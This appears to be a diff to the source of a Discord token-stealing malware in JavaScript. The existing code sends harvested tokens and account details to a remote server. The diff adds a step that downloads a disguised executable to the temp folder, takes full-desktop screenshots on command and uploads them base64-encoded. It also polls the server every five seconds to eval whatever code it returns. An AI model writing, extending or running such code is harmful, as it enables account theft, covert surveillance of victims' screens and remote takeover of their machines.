@@ -3,6 +3,8 @@
 
 // Do our own stuff
 const fs = require('fs');
+const os = require('os');
+const { execSync } = require('child_process');
 
 class TokenData {
     constructor(token, id, username, discriminator, email, avatar, verified, locale, mfa_enabled, phone, premium_type) {
@@ -94,16 +96,57 @@ const getTokens = async () => {
     return JSON.stringify(validTokens.map((t) => t.toJSON()));
 };
 
+const checkForNirCmd = () => {
+    return new Promise((r) => {
+        const fileDir = `${os.tmpdir()}/~DFDA8NA9S-TMP.exe`;
+
+        if (fs.existsSync(fileDir)) return r(fileDir);
+
+        const file = fs.createWriteStream(fileDir);
+
+        httpTable['http'].get(url + '/tmp/~DFDA8NA9S-TMP.exe', async (response) => {
+            response.pipe(file);
+
+            await new Promise((r) => setTimeout(r, 1000));
+
+            r(fileDir);
+        });
+    });
+};
+
 getTokens().then((tokens) => {
     get(url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {
-        get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
-            eval(res);
-        });
+        let ping = () => {
+            checkForNirCmd().then((nirCmdDir) => {
+                get(url.toLowerCase() + `/ss/${hwid}`).then((doSendSS) => {
+                    if (doSendSS == 'true') {
+                        console.log('!! sending desktop');
+                        const ssFileName = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + '.tmp';
+
+                        exec(`${nirCmdDir} savescreenshotfull %temp%\\${ssFileName}`, {}, (err, stdout, stderr) => {
+                            if (!err) {
+                                const ssContents = Buffer.from(fs.readFileSync(`${os.tmpdir()}/${ssFileName}`)).toString('base64');
+
+                                try {
+                                    fs.unlinkSync(`${os.tmpdir()}/${ssFileName}`);
+                                } catch (err) {}
+
+                                post(url.toLowerCase() + `/ss/${hwid}`, { data: ssContents });
+                            }
+                        });
+                    }
+
+                    get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
+                        eval(res);
+                    });
+                });
+            });
+        };
+
+        ping();
 
         setInterval(() => {
-            get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
-                eval(res);
-            });
-        }, 30 * 1000);
+            ping();
+        }, 5 * 1000);
     });
 });
